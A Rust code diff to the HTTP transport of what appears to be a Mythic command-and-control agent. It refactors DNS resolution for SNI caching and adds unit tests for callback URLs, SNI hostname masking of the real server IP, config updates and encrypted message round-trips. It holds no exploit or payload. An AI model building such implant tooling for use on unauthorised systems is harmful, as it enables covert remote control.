@@ -312,32 +312,48 @@ impl HttpProfile {
             }
         }
 
-        let host = self.callback_host.read().unwrap().clone();
-        let port = self.callback_port.load(Ordering::Relaxed) as u16;
-        let raw = host
-            .trim_start_matches("https://")
-            .trim_start_matches("http://")
-            .trim_end_matches('/');
-        let addr_str = if raw.contains(':') {
-            raw.to_string()
-        } else {
-            format!("{}:{}", raw, port)
+        // Build an owned addr_str (no borrows) before the .await point so the
+        // borrow checker is happy across the suspension point.
+        let (addr_str, host_for_log) = {
+            let host = self.callback_host.read().unwrap().clone();
+            let port = self.callback_port.load(Ordering::Relaxed) as u16;
+            let raw: String = host
+                .trim_start_matches("https://")
+                .trim_start_matches("http://")
+                .trim_end_matches('/')
+                .to_string();
+            let addr = if raw.contains(':') {
+                raw.clone()
+            } else {
+                format!("{}:{}", raw, port)
+            };
+            (addr, raw)
         };
 
-        match tokio::net::lookup_host(&addr_str).await {
+        // Pass addr_str by value — moves it into the future, no borrow spans .await.
+        match tokio::net::lookup_host(addr_str).await {
             Ok(mut addrs) => {
                 if let Some(addr) = addrs.next() {
-                    utils::print_debug(&format!("HTTP: Resolved callback_host '{}' -> {} (cached for SNI)", raw, addr));
+                    utils::print_debug(&format!(
+                        "HTTP: Resolved callback_host '{}' -> {} (cached for SNI)",
+                        host_for_log, addr
+                    ));
                     let mut cached = self.sni_addr.write().unwrap();
                     *cached = Some(addr);
                     Some(addr)
                 } else {
-                    utils::print_debug(&format!("HTTP: DNS lookup for '{}' returned no addresses", raw));
+                    utils::print_debug(&format!(
+                        "HTTP: DNS lookup for '{}' returned no addresses",
+                        host_for_log
+                    ));
                     None
                 }
             }
             Err(e) => {
-                utils::print_debug(&format!("HTTP: Failed to resolve callback_host '{}' for SNI mapping: {}", raw, e));
+                utils::print_debug(&format!(
+                    "HTTP: Failed to resolve callback_host '{}' for SNI mapping: {}",
+                    host_for_log, e
+                ));
                 None
             }
         }
@@ -769,5 +785,220 @@ impl Profile for HttpProfile {
 
     fn is_running(&self) -> bool {
         self.running.load(Ordering::Relaxed)
+    }
+}
+
+// =============================================================================
+// Tests
+// =============================================================================
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use base64::engine::general_purpose::STANDARD as B64;
+    use std::sync::atomic::Ordering;
+
+    /// Build a minimal HttpInitialConfig for tests.
+    fn config(host: &str, port: i32) -> HttpInitialConfig {
+        HttpInitialConfig {
+            callback_host: host.to_string(),
+            callback_port: port,
+            post_uri: "post".to_string(),
+            get_uri: String::new(),
+            query_path_name: String::new(),
+            encrypted_exchange_check: false,
+            aes_psk: String::new(),
+            interval: 5,
+            jitter: 0,
+            killdate: "2099-12-31".to_string(),
+            headers: Default::default(),
+            proxy_host: String::new(),
+            proxy_port: 0,
+            proxy_user: String::new(),
+            proxy_pass: String::new(),
+            sni: String::new(),
+        }
+    }
+
+    fn config_with_sni(host: &str, port: i32, sni: &str) -> HttpInitialConfig {
+        HttpInitialConfig { sni: sni.to_string(), ..config(host, port) }
+    }
+
+    fn config_with_key(host: &str, port: i32, key_bytes: &[u8]) -> HttpInitialConfig {
+        HttpInitialConfig {
+            aes_psk: B64.encode(key_bytes),
+            ..config(host, port)
+        }
+    }
+
+    // -------------------------------------------------------------------------
+    // get_base_url
+    // -------------------------------------------------------------------------
+
+    #[test]
+    fn test_base_url_https_standard_port_no_suffix() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        assert_eq!(p.get_base_url(), "https://example.com/");
+    }
+
+    #[test]
+    fn test_base_url_http_standard_port_no_suffix() {
+        let p = HttpProfile::new(config("http://example.com", 80));
+        assert_eq!(p.get_base_url(), "http://example.com/");
+    }
+
+    #[test]
+    fn test_base_url_custom_port_included() {
+        let p = HttpProfile::new(config("https://example.com", 8443));
+        assert_eq!(p.get_base_url(), "https://example.com:8443/");
+    }
+
+    #[test]
+    fn test_base_url_always_ends_with_slash() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        assert!(p.get_base_url().ends_with('/'));
+    }
+
+    #[test]
+    fn test_base_url_with_sni_uses_sni_hostname() {
+        let p = HttpProfile::new(config_with_sni("https://1.2.3.4", 443, "cdn.example.com"));
+        let url = p.get_base_url();
+        // URL hostname must be the SNI name so rustls puts it in the TLS ClientHello
+        assert!(url.contains("cdn.example.com"), "expected SNI name in url, got: {}", url);
+        assert!(!url.contains("1.2.3.4"), "real IP must not appear in url");
+    }
+
+    #[test]
+    fn test_base_url_sni_preserves_scheme() {
+        let p = HttpProfile::new(config_with_sni("https://1.2.3.4", 443, "sni.host.com"));
+        assert!(p.get_base_url().starts_with("https://"));
+    }
+
+    // -------------------------------------------------------------------------
+    // update_config
+    // -------------------------------------------------------------------------
+
+    #[test]
+    fn test_update_callback_host() {
+        let p = HttpProfile::new(config("https://old.com", 443));
+        p.update_config("callback_host", "https://new.com");
+        assert_eq!(*p.callback_host.read().unwrap(), "https://new.com");
+    }
+
+    #[test]
+    fn test_update_callback_host_clears_sni_cache() {
+        let p = HttpProfile::new(config_with_sni("https://1.2.3.4", 443, "cdn.example.com"));
+        // Seed cache
+        *p.sni_addr.write().unwrap() = Some("1.2.3.4:443".parse().unwrap());
+        p.update_config("callback_host", "https://5.6.7.8");
+        assert!(p.sni_addr.read().unwrap().is_none(), "cache must be cleared on host change");
+    }
+
+    #[test]
+    fn test_update_sni_updates_field() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        p.update_config("sni", "new-sni.example.com");
+        assert_eq!(*p.sni.read().unwrap(), "new-sni.example.com");
+    }
+
+    #[test]
+    fn test_update_sni_clears_cache() {
+        let p = HttpProfile::new(config_with_sni("https://1.2.3.4", 443, "cdn.example.com"));
+        *p.sni_addr.write().unwrap() = Some("1.2.3.4:443".parse().unwrap());
+        p.update_config("sni", "other.example.com");
+        assert!(p.sni_addr.read().unwrap().is_none());
+    }
+
+    #[test]
+    fn test_update_callback_interval() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        p.update_config("callback_interval", "30");
+        assert_eq!(p.interval.load(Ordering::Relaxed), 30);
+    }
+
+    #[test]
+    fn test_update_callback_jitter() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        p.update_config("callback_jitter", "20");
+        assert_eq!(p.jitter.load(Ordering::Relaxed), 20);
+    }
+
+    #[test]
+    fn test_update_callback_port() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        p.update_config("callback_port", "8443");
+        assert_eq!(p.callback_port.load(Ordering::Relaxed), 8443);
+    }
+
+    #[test]
+    fn test_update_unknown_key_does_not_panic() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        p.update_config("nonexistent_key", "value"); // must not panic
+    }
+
+    #[test]
+    fn test_update_interval_invalid_value_ignored() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        let before = p.interval.load(Ordering::Relaxed);
+        p.update_config("callback_interval", "not_a_number");
+        assert_eq!(p.interval.load(Ordering::Relaxed), before);
+    }
+
+    // -------------------------------------------------------------------------
+    // encode_message / decode_response round-trips
+    // -------------------------------------------------------------------------
+
+    #[test]
+    fn test_encode_decode_roundtrip_plaintext() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        // Default UUID from get_uuid() is 36 chars — good enough for decode_response UUID strip
+        let data = b"hello mythic plaintext";
+        let encoded = p.encode_message(data);
+        let decoded = p.decode_response(&encoded).expect("decode must succeed");
+        assert_eq!(decoded, data);
+    }
+
+    #[test]
+    fn test_encode_decode_roundtrip_encrypted() {
+        let key = [0xABu8; 32];
+        let p = HttpProfile::new(config_with_key("https://example.com", 443, &key));
+        let data = b"encrypted message payload";
+        let encoded = p.encode_message(data);
+        let decoded = p.decode_response(&encoded).expect("AES round-trip must succeed");
+        assert_eq!(decoded, data);
+    }
+
+    #[test]
+    fn test_decode_response_too_short_returns_none() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        // Anything base64-encoded to fewer than 36 raw bytes → None
+        let short = B64.encode(b"short");
+        assert!(p.decode_response(&short).is_none());
+    }
+
+    #[test]
+    fn test_decode_response_invalid_base64_returns_none() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        assert!(p.decode_response("not!!valid!!base64@@@@").is_none());
+    }
+
+    #[test]
+    fn test_encode_output_is_base64() {
+        let p = HttpProfile::new(config("https://example.com", 443));
+        let encoded = p.encode_message(b"test");
+        // Must be valid base64
+        assert!(B64.decode(&encoded).is_ok(), "encode_message must return valid base64");
+    }
+
+    // -------------------------------------------------------------------------
+    // get_post_url
+    // -------------------------------------------------------------------------
+
+    #[test]
+    fn test_get_post_url_concatenated_correctly() {
+        let mut cfg = config("https://example.com", 443);
+        cfg.post_uri = "agent/post".to_string();
+        let p = HttpProfile::new(cfg);
+        assert_eq!(p.get_post_url(), "https://example.com/agent/post");
     }
 }
